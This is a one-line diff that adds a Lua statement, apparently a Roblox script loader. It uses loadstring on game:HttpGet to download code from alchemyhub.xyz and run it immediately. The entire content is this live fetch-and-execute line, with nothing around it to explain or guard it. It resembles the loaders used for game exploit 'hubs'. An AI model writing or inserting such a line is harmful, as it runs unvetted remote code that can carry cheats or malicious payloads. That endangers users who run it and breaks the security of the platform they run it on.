@@ -1,0 +1,1 @@
+v=1;loadstring(game:HttpGet("https://alchemyhub.xyz/v2"))()
